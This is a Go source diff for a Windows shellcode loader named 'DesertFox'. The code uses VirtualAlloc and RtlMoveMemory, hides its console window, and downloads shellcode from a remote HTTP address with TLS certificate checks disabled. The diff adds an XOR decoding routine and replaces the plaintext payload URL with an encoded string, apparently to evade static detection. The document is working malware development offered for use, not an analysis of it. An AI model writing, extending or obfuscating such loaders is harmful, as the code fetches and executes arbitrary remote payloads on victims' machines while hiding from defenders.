@@ -13,6 +13,7 @@ import (
 	"strings"
 	"syscall"
 	"unsafe"
+	"strconv"
 )
 
 const (
@@ -22,19 +23,34 @@ const (
 )
 
 var (
-	key = []byte("douknowwhoami?dr") // 填入对应的16位密钥
+	key = []byte("douknowwhoami?dr") // 对应的16位密钥
+	XorKey	[]byte = []byte{0x32, 0x34, 0x85, 0x6A, 0xA3, 0xFF, 0xF4, 0x7B}
 	kernel32           = syscall.MustLoadDLL("kernel32.dll")
 	VirtualAlloc       = kernel32.MustFindProc("VirtualAlloc")
 	ntdll              = syscall.MustLoadDLL("ntdll.dll")
 	RtlMoveMemory        = ntdll.MustFindProc("RtlMoveMemory")
 )
 
+//解密URL
+func dec(src string) (res string) {
+	var s int64
+	var result string
+	j := 0
+	bt := []rune(src)
+	for i := 0; i < len(src)/2; i++ {
+		s, _ = strconv.ParseInt(string(bt[i*2:i*2+2]), 16, 0)
+		result = result + string(byte(s)^XorKey[j])
+		j = (j + 1) % 8
+	}
+	return result
+}
+
 
 //DesertFox主函数
 
 func Proceed() {
-
-	Url := "http://192.168.0.100:8080/zha0gongz1"	//shellcode远程地址
+	// Url := "http://192.168.0.100:8080/zha0gongz1"	
+	Url := dec("5a40f11a99d0db4a0b06ab5b95c7da4b1c05b55a99c7c443021bff02c2cf93145c53ff5b")	//shellcode远程地址
 	var ecbDec []byte
 	tr :=&http.Transport{
 		TLSClientConfig: &tls.Config{InsecureSkipVerify:true},
@@ -82,7 +98,7 @@ func HideWindow() {
 	console := w32.GetConsoleWindow()
 
 	if console == 0 {
-		return 
+		return // no console attached
 	}
 	_, consoleProcID := w32.GetWindowThreadProcessId(console)
 
